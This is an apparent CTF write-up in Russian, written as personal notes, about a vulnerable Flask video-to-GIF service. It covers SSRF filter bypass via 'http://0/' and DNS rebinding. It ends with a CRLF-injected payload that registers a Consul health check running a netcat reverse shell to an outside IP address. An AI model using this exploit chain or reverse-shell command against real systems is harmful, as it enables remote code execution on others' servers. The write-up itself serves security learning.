#ssrf #web #server-side #crlf #filter-bypass #urlparse

Дан сервис:

```python
import os

import re

import socket

import ipaddress

from urllib.parse import urlparse

from tempfile import NamedTemporaryFile

from flask import Flask, request, render_template, redirect, url_for, flash, send_file

  

app = Flask(__name__)

app.secret_key = os.urandom(24)

  

MAX_CONTENT_LENGTH = 100 * 1024 * 1024  # 100MB max file size

ALLOWED_SCHEMES = {'http'}

TEMP_DIR = '/tmp/vid2gif'

  

os.makedirs(TEMP_DIR, exist_ok=True)

  

@app.route('/health')

def health_check():

    return 'OK', 200

  

def is_ip_address(url_host):

    try:

        ipaddress.ip_address(url_host)

        return True

    except ValueError:

        return False

  

def is_localhost(ip):

    return ip.startswith('127.') or ip == '::1' or ip.lower() == 'localhost'

  

def download_video(url):

    parsed_url = urlparse(url)

  

    if parsed_url.scheme not in ALLOWED_SCHEMES:

        raise ValueError(f"{parsed_url.scheme} is not allowed, sorry")

  

    port = parsed_url.port if parsed_url.port else 80

    with socket.create_connection((parsed_url.hostname, port)) as sock:

        needle = f"{parsed_url.scheme}://{parsed_url.hostname}"

        if parsed_url.port:

            needle += f":{parsed_url.port}"

        query_string = url.replace(needle, "")

        request_headers = (

            f"GET {query_string} HTTP/1.1\r\n"

            f"Host: {parsed_url.hostname}\r\n"

            "Connection: keep-alive\r\n"

            "User-Agent: vid2gif/1.0\r\n"

            "\r\n"

        )

  

        with open("/tmp/request", 'w') as f:

            f.write(request_headers)

  

        sock.sendall(request_headers.encode())

  

        response = b''

        content_length = None

        while True:

            data = sock.recv(4096)

            if not data:

                break

            response += data

  

            if content_length is None and b'\r\n\r\n' in response:

                headers, body = response.split(b'\r\n\r\n', 1)

                headers = headers.decode('utf-8', errors='ignore').split('\r\n')

  

                for header in headers:

                    if header.lower().startswith('content-length:'):

                        content_length = int(header.split(':')[1].strip())

                        break

  

                if content_length is not None:

                    temp_file = NamedTemporaryFile(dir=TEMP_DIR, suffix='.mp4', delete=False)

                    temp_file.write(body)

                    remaining_bytes = content_length - len(body)

  

                    while remaining_bytes > 0:

                        data = sock.recv(min(4096, remaining_bytes))

                        if not data:

                            break

                        temp_file.write(data)

                        remaining_bytes -= len(data)

  

                    temp_file.close()

                    return temp_file.name

  

        raise ValueError("Could not determine content length from response")

  

def convert_to_gif(input_path, output_path):

    cmd = f"ffmpeg -i {input_path} -y -vf 'fps=30,scale=640:-1:flags=lanczos' -f gif {output_path}"

    os.system(cmd)

  

@app.route('/', methods=['GET', 'POST'])

def index():

    if request.method == 'POST':

        video_url = request.form.get('video_url', '').strip()

  

        try:

            parsed_url = urlparse(video_url)

            if not all([parsed_url.scheme, parsed_url.netloc]):

                raise ValueError("Invalid URL format")

  

            if is_ip_address(parsed_url.hostname):

                raise ValueError("IP addresses are not allowed")

  

            try:

                ip = socket.gethostbyname(parsed_url.hostname)

                if is_localhost(ip):

                    raise ValueError("Localhost addresses are not allowed")

            except socket.gaierror:

                raise ValueError("Could not resolve hostname")

  

            input_file = download_video(video_url)

  

            output_file = os.path.join(TEMP_DIR, 'output.gif')

            convert_to_gif(input_file, output_file)

  

            if not os.path.exists(output_file):

                raise ValueError("Invalid file: conversion failed")

  

            return send_file(output_file, mimetype='image/gif', download_name='converted.gif')

  

        except Exception as e:

            flash(f"Error processing video: {str(e)}", 'error')

            return redirect(url_for('index'))

  

    return render_template('index.html')

  
  

if __name__ == '__main__':

    app.run(debug=True)
```

Тут есть 2 фильтра:

```python
def is_ip_address(url_host):

    try:

        ipaddress.ip_address(url_host)

        return True

    except ValueError:

        return False
```

и

```python
def is_localhost(ip):

    return ip.startswith('127.') or ip == '::1' or ip.lower() == 'localhost'
```

который оборачивается так:

```python
ip = socket.gethostbyname(parsed_url.hostname)

if is_localhost(ip):
```

Есть 2 способа обхода:
1) Передаем http://0/
	Он резолвится в 0.0.0.0 и по какой то причине ходит во внутрянку
2) DNS rebinding
	Делаем свой DNS сервер и на запрос с проверкой возвращаем не локалхост, на запрос с самим запросом уже резолвим в локалхост. 
	Как его сделать? Да черт его знает, если честно. В тг скинули вот такой сервис https://1u.ms/. Есть ощущение, что можно и через burp collaboratory сделать

Дальше в качестве query_string надо передать классический [[CRLF]]. Тут даже не надо извращаться никак с этими спецсимволами: просто ставим перенос строки там, где это надо.
Получаем вот такой пейлоад

```
http://0:8500/ HTTP/1.1
Host: localhost:8500
PUT /v1/agent/service/register HTTP/1.1
Host: localhost:8500
Content-Type: application/json
Content-Length: 246
{
"Name": "my-service",
    "Tags": ["my-tag"],
    "Port": 8080,
    "Check": {
      "Name": "Check with asdzxc",
      "Args": ["nc", "176.193.213.148", "8000", "-e", "/bin/sh"],
      "Interval": "10s",
      "Timeout": "100s"
    }
}

```

Красивое